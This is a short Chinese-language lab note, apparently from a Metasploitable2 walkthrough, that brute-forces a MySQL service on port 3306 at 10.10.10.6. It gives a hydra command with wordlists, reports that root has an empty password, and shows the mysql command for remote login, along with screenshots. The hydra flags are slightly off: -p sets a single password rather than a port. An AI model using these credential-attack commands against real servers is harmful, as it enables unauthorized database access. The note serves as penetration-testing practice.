# 3306_mysql

使用hydra爆破

> hydra 10.10.10.6 -L /root/username.txt -P password.txt -p 3306 mysql

![image-20210319150832611](../../image/meteaspolitale2/image-20210319150832611.png)

得到root用户是空密码

直接远程登录

> mysql -h 10.10.10.6 -u root

![image-20210319152512329](../../image/meteaspolitale2/image-20210319152512329.png)

登录成功

使用图形化工具也可以连接成功

![image-20210319152919961](../../image/meteaspolitale2/image-20210319152919961.png)

![image-20210319153018887](../../image/meteaspolitale2/image-20210319153018887.png)